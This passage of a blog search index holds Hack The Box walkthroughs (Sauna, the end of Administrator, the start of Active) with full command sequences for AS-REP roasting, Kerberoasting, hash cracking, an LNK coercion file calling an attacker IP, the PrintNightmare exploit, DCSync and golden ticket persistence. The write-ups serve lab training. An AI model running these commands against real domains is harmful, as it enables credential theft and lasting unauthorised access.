DONT_REQ_PREAUTH flag is not already set on any accounts by using the AD PowerShell module:\nGet-DomainUser -PreauthNotRequired As we can see it is not. Using AD PowerShell Module to set DONT_REQ_PREAUTH flag on Ethan\u0026rsquo;s account: This module is already built in and enabled on this host so this is the easiest way. Using Active Directory PowerShell Module: Get-ADUser Ethan | Set-ADAccountControl -DoesNotRequirePreAuth $true Verify it worked: Get-DomainUser -PreauthNotRequired Using PowerView to set DONT_REQ_PREAUTH flag on Ethan\u0026rsquo;s account: Transfer PowerView via evil-winrm:\nImport powerview:\n. .\\PowerView.ps1 Set the Pre-Auth to be true PowerView:\nSet-DomainObject -Identity ethan -Set @{'userAccountControl' = 4194304} +Note+: Setting userAccountControl to 4194304 disables Pre-Authentication (equivalent to DoesNotRequirePreAuth). Verify it worked:\nGet-DomainUser -UACFilter DONT_REQ_PREAUTH As we can see it worked. AS-REP roasting Ethan using Impacket-GetNPUsers: impacket-GetNPUsers $domain/ethan -dc-ip $box -no-pass -format hashcat -outputfile asrep.txt +Note+: For some reason it threw some errors, despite having the time set \u0026amp; also did not save the hash to a file, so I have to save to a file manually. Cracking Ethans AS-REP Hash Using Hashcat: This will still gives us the same password etc as we have seen before it\u0026rsquo;s just a different method for doing so. hashcat -m 18200 AS-REP.txt ~/Wordlists/rockyou.txt Lessons Learned: What did I learn? I learned that no matter how much I try and convince myself it\u0026rsquo;s true unless I have write properties on an object I do not. I learned about cracking password safe files, I have never done that before so it was good to do. What silly mistakes did I make? See note 1 above. Standard, reset box and didn\u0026rsquo;t update my /etc/hosts and was like \u0026ldquo;wow that is strange behaviour it must be intended, until I realised I was just stupid\u0026rdquo; Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/administrator-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/as-reproasting\/": {
        "title": "AS-REPRoasting",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/as-reproasting\/"
    },
    
    "http:\/\/localhost:1313\/tags\/pwsafe\/": {
        "title": "Pwsafe",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/pwsafe\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/sauna-box\/": {
        "title": "Sauna HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Windows","LDAP","Kerberos","Active Directory","Kerberoasting","ASREPRoasting","PrintNightmare","CVE-2021-1675",],
        "content": " Sauna Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Sauna How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Sauna/scans/nmap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:01:03 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 08:01 GMT Nmap scan report for 10.129.118.79 Host is up (0.038s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 4.38 seconds Initial thoughts: Good places to start enumeration are, DNS, Web, RPC, LDAP, Kerberos \u0026amp; SMB. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Sauna/scans/nmap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:01:33 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 08:03 GMT Nmap scan report for 10.129.118.79 Host is up (0.038s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-03 15:07:20Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49677/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC 49717/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-11-03T15:08:18 |_ start_date: N/A |_clock-skew: 7h00m00s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required OS and Service detection performed. Please report any incorrect resu LDAP 389: Using LDAP to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 ldapchecker.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in HTB/BlogEntriesMade/Sauna/scans/ldap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:08:25 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box Attempting to connect to 10.129.118.79 with SSL... Failed to connect with SSL. Attempting to connect to 10.129.118.79 with non-SSL... Connected successfully using anonymous bind. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=EGOTISTICAL-BANK,DC=LOCAL CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. Updating ETC/HOSTS \u0026amp; Variables Updated Domain \u0026amp; Machine Variables for Testing: Now that I have this information, I can update the `domain` and `machine` variables used in tests: update_var domain \u0026quot;EGOTISTICAL-BANK.LOCAL\u0026quot; update_var machine \u0026quot;SUANA\u0026quot; +Note+: This is a type-o it should say SAUNA I corrected this later. Always copy and paste! Updating /etc/hosts for DNS and LDAP Queries: I update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts. sudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note. RPC: I connect via rpc and try and enumerate the groups \u0026amp; users but have nno perms: rpcclient -U '%' $box Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt We get two hits which I add to my list of users: hsmith@EGOTISTICAL-BANK.LOCAL fsmith@EGOTISTICAL-BANK.LOCAL Trying Usernames as Passwords: I always try usernames as passwords as well: netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+] No hits. ASREPRoasting: Using netexec for ASReproasting: We should always try and asreproast with a null/guest session anyway netexec ldap $box -u '' -p '' --asreproast asrep.txt netexec ldap $box -u guest -p '' --asreproast asrep.txt We get no hits. Using Impacket-GetNPUsers for asreproasting: As we have some usernames we can try targeted asreproasting. impacket-GetNPUsers $domain/ -dc-ip $box -no-pass -usersfile Users.txt -format hashcat -outputfile asrep.txt We get a hit for fsmith Cracking fsmiths asrep hash using hashcat: I use hashcat to crack the ticket: hashcat -m 18200 asrep.txt /home/kali/Wordlists/rockyou.txt SMB 445: +Important note on methodology+: If you\u0026rsquo;re wondering why I am still enumerating for null sessions, web, etc when I have cracked a hash, it\u0026rsquo;s because there could still be some interesting findings and low-hanging fruit. Boxes are great as they train us and help us hone our skills, but businesses want all findings not just the most serious. It\u0026rsquo;s good practice to treat boxes like an engagement. I you want to jump ahead, go to the foothold section. Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares Guest account is disabled. netexec smb $box -u '' -p '' --shares Null session has been disabled: Web 80: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Enumerating Injection Points: Looking at the site there appears to be an injection point in the Apply Now page: I enter data.\nOnce submitted I get the following response:\n405 - HTTP verb used to access this page is not allowed. Looking at the request and response in burpsuite we see the following:\nWe can see this was originally sent as a POST request, but the page only allows the following HTTP methods: GET, HEAD, OPTIONS, and TRACE. Let’s re-send our request using one of these allowed methods to observe the response. Verb Tampering Enumeration: I right-click the orginal request and select \u0026ldquo;Send to Repeater\u0026rdquo;:\nChecking GET Reqeuest:\nNothing of note. Checking HEAD Reqeuest:\nNothing of note. Checking OPTIONS Reqeuest:\nNothing of note. Checking TRACE Reqeuest:\nNothing of note. Dirbusting the webserver using ffuf: I Perform some directory busting to see if there are any interesting directories:\nffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://10.129.118.79/FUZZ -fc 403 -ic Nothing of note in the toplevel. I also check for additional files:\nffuf -w /home/kali/Wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://10.129.118.79/FUZZ.html -fc 403 -ic There does not seem to be anything immediatley obvious with the webserver so I am going to continue enumerating however now as our user.\n2. Foothold: Enumerating as fsmith: Enumerating shares: I see what shares we have access to: netexec smb $box -u $user -p $pass --shares There are some here which look interesting: SYSVOL (can hold scripts) print$ (printer drivers) RICOH Aficio SP 8300DN PCL 6 Enumerating the host via evil-winrm: I connect via evil-winrm:\nevil-winrm -i $box -u $user -p $pass I grab the user flag:\nChecking privileges and group membership: Group:\nwhoami /groups nothing of note Privs:\nwhoami /priv nothing of note Enumerating users: We can see that there is a user called svc_loanmgr so there is a service account running somewhere. I will enumerate more users and groups using impacket. Enumerating Users \u0026amp; Groups on the domain using impacket-lookupsid: I run impacket-lookupsid to enumerate all users and groups on the domain: impacket-lookupsid $user@$box -domain-sids As expected no other users on the domain apart from the standard built in ones. I add these users to my user list. Using smbclient to enumerate shares: print$ share enumeration:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\print$\u0026quot; +Note+: This appears to be a standard printer share. I will leave this for the moment and come back to it later if needed. NETLOGON share enumeration:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\NETLOGON\u0026quot;\nIt\u0026rsquo;s empty (as expected) SYSVOL share enumeration:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\SYSVOL\u0026quot; Scripts dir is empty: Ricoh share enumeration:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\RICOH Aficio SP 8300DN PCL 6\u0026quot;\nEmpty but writeable, we can come back to this later. Kerberoasting hsmith: As we have credentials we can perform kerberoasting:\nI use netexec to kerberoast: netexec ldap $machine.$domain -u $user -p $pass --kerberoasting kerb.out We get a hit for hsmith Cracking hsmith\u0026rsquo;s password with hashcat: I run it through hashcat and crack the hash: hashcat -m 13100 kerb.out ~/Wordlists/rockyou.txt It cracks, annoyingly it\u0026rsquo;s the same password as fsmith so I should have checked for password re-use between users, this is a learning moment. Enumerating as hsmith: Checking the shares they have access to we can see it\u0026rsquo;s the same as fsmith.\nInterestingly they do not have win-rm access.\nCreating an LNK file on the rico share: I create an LNK file on the rico share using netexec:\nnetexec smb $box -u $user -p $pass -M slinky -o SERVER=10.10.14.121 NAME=important I start my listener using responder:\nsudo responder -I tun0 I leave it running for a long time but do not get a hit. LNK attack Explanation: Even though this didn\u0026rsquo;t work I wanted to explain the concept and methodology. Creating an LNK file on the rico SMB share using netexec allows me to inject a shortcut that, when opened, will trigger code execution with minimal user interaction. By specifying the parameters SERVER=10.10.14.121 and NAME=important, I\u0026rsquo;m directing the LNK to attempt a network connection to my listener at 10.10.14.121, exploiting the target\u0026rsquo;s file interaction to potentially escalate privileges or gain further access. This setup leverages user trust in shared network files, making it a low-profile way to initiate a callback for further exploitation. Performing a bloodhound scan: Usually I would do this first, however I got caught up in easy low-hanging fruit priv-esc paths. bloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box Looking at the results there is nothing immediately sticking out to me. Enumerating description fields using rpcclient: I connect using rpcclient and enumerate the description fields of the administrator and svc_loanmgr account in-case they had stored credentials in these field however they don\u0026rsquo;t have any: 3. Privilege Escalation: Privilege escalation Route 1 PrintNightmare: Discovering the host is susceptible to PrintNightmare vulnerability: netexec smb $box -u $user -p $pass -M printnightmare +Note+: I have a priv-esc checklist that I run through when I am working on machines and checking for PrintNightmare is one of these checks (I didn\u0026rsquo;t just magically stumble upon the idea). However now we have a viable path forward. Privilege escalation Route 2 svc_loanmgr: There is also the option of this other privesc path (and I believe intended approach) Approach 1: Using winpeas to find clear-text creds stored in Registry Keys: I upload winpeas.ps1 via my evil-winrm session as fsmith:\nRunning it we find that there are creds available for win-logon which are stored in clear-text:\n+Note+: That the default username is svc_loanmanager however there is not user with that name on this machine. However there is a svc_loanmgr: Verifying the credentials work for svc_loanmgr:\nApproach 2: Manually Enumerating Registry Keys for Valuable Information: We can also search for these manually using: reg query \u0026quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026quot; +Note+: Direct registry access may trigger logging events or alerts, especially if policies are in place. Discovering svc_loanmgr has DC-Sync privileges: Looking back in bloodhound we can see our user has GetChangesAll \u0026amp; GetChanges over the root domain object: Looking at the attack paths we have with GetChangesAll we can see we can:\nYou may perform a dcsync attack to get the password hash of an arbitrary principal using impacket\u0026rsquo;s secretsdump.py example script:\nThis means we can perform a dcsync attack to get the hashes. Overview of these rights: Replicating Directory Change (GetChanges): Display Name: Replicating Directory Changes Common Name: DS-Replication-Get-Changes, GetChanges Rights GUID Value: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 Interpretation: Required to replicate changes from a given NC (Naming Context). To perform a DCSync attack, this extended right and DS-Replication-Get-Changes-All (below) +are required+. In bloodhound displayed as: GetChanges Replicating Directory Changes All (GetChangesAll): Display Name: Replicating Directory Changes All Common Name: DS-Replication-Get-Changes-All, GetChangesAll Rights GUID Value: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 Interpretation: Allows the replication of secret domain data. To perform a DCSync attack, this extended right and DS-Replication-Get-Changes (above) +are required+. In bloodhound displayed as: GetChangesAll 4. Ownership: Privilege escalation Route 1 PrintNightmare: Creating a new administrator user using CVE-2021-1675 (PrintNightmare exploit): Download POC:\ngit clone https://github.com/calebstewart/CVE-2021-1675.git This is the exploit I have used before so will use again. Using our existing fsmith credentials upload the script via evil-winrm:\nBypass Execution Policy:\nSet-ExecutionPolicy Bypass -Scope Process Import the exploit Module:\nImport-Module .\\CVE-2021-1675.ps1 Add our new user with PrintNightmare PowerShell PoC:\nInvoke-Nightmare -NewUser \u0026quot;bloodstiller\u0026quot; -NewPassword \u0026quot;Pwnd1234!\u0026quot; -DriverName \u0026quot;PrintIt\u0026quot; Confirm our user added is added:\nnet user bloodstiller We can see we have local admin privs. Connecting as our new local-admin user: I connect usin evil-winrm\nAs we have local admin privs we can retrieve the flag from the administrator folder:\nPrivilege escalation Route 2 svc_loanmgr: Performing a DC-SYNC attack as svc_loanmgr: We perform the dc-sync attack using svc_loanmgr account and impacket-secretsdump: impacket-secretsdump $domain/$user:$pass@$box -dc-ip $box All of the same steps can be peformed to create a golden ticket in the persistence section now etc. 5. Persistence: Dumping NTDS.dit/DC-SYNC attack: As we are local admin we can perform a DCSync Attack using netexec:\nnetexec smb $box -u $user -p $pass -M ntdsutil Extract all hashes from netexec\nfor file in /home/kali/.nxc/logs/*.ntds; do cat \u0026quot;$file\u0026quot; | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\\n'; done Creating a Kerberos Golden Ticket: Using impacket-lookupsid to get the Search for the Domain SID:\nimpacket-lookupsid $domain/$user@$machine.$domain -domain-sids Sync our clock to the host using ntupdate:\nsudo ntpdate -s $domain This does not need to be done again (as I have already done it. However i\u0026rsquo;ve left it here in case when you do this you forget) Using impacket-ticketer to create the Golden Ticket:\nimpacket-ticketer $box -nthash [KRBTGTHash] -domain-sid [SID] -domain $domain Administrator Export the ticket to the KRB5CCNAME Variable:\nexport KRB5CCNAME=./Administrator.ccache Use the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain Why create a golden ticket? \u0026ldquo;But bloodstiller why are you making a golden ticket if you have the admin hash?\u0026rdquo; Glad you asked: Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why: KRBTGT Hash Dependence: Golden Tickets are generated using the KRBTGT account hash from the target’s domain controller. Unlike user account passwords, KRBTGT hashes are rarely rotated (and in many organizations, they are never changed), so the Golden Ticket remains valid indefinitely. KRBTGT Hash—The Key to It All (for upto 10 years): A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials. This makes it a reliable backdoor, especially if re-access is needed long after initial entry. Think about it: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the KRBTGT account, not individual users. Lessons Learned: What did I learn? I should always check for password re-use even between accounts! It was good to attack this from a privilege escalation point of view from 2 different angles, showing the more recent PrintNightmare as well as the intended route of WinLogon clear-text creds. What silly mistakes did I make? Should have copied and pasted, ended up writing suana instead of sauna in my /etc/hosts Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/sauna-box\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/active-box\/": {
        "title": "Active HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Windows","LDAP","Kerberoasting","Kerberos","cpassword","Active Directory",],
        "content": "Active Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Active How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Active/scans/nmap 🍣 main 📝 ×115🛤️ ×225 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 21:57:59 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 21:58 GMT Nmap scan report for 10.129.58.199 Host is up (0.041s latency). Not shown: 983 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 3.89 seconds Initial thoughts: SMB, Kerberos, SMB, LDAP \u0026amp; RPC are great enumeration targets Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Active/scans/nmap 🍣 main 📝 ×115🛤️ ×225 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 21:58:38 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 21:59 GMT Nmap scan report for 10.129.58.199 Host is up (0.040s latency). Not shown: 65512 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-01 15:05:52Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49162/tcp open msrpc Microsoft Windows RPC 49166/tcp open msrpc Microsoft Windows RPC 49168/tcp open msrpc Microsoft Windows RPC No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=11/1%OT=53%CT=1%CU=39275%PV=Y%DS=2%DC=I%G=Y%TM=6725 OS:510D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%CI=I%II=I%TS=7)SEQ(S OS:P=105%GCD=1%ISR=104%TI=I%CI=I%II=I%TS=7)OPS(O1=M53CNW8ST11%O2=M53CNW8ST1 OS:1%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000% OS:W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CN OS:W8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R= OS:Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=A OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%D OS:F=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=8 OS:0%CD=Z) Network Distance: 2 hops Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required | smb2-time: | date: 2024-11-01T15:07:00 |_ start_date: 2024-11-01T14:46:20 |_clock-skew: -7h00m00s OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 452.68 seconds LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 ldapchecker.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in HTB/BlogEntriesMade/Active/scans/ldap 🍣 main 📝 ×115🛤️ ×225 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 22:00:23 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box Attempting to connect to 10.129.58.199 with SSL... Failed to connect with SSL. Attempting to connect to 10.129.58.199 with non-SSL... Connected successfully using anonymous bind. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=active,DC=htb CN=Configuration,DC=active,DC=htb CN=Schema,CN=Configuration,DC=active,DC=htb DC=DomainDnsZones,DC=active,DC=htb DC=ForestDnsZones,DC=active,DC=htb We have the domain functionality level:\ndomainFunctionality: 4 forestFunctionality: 4 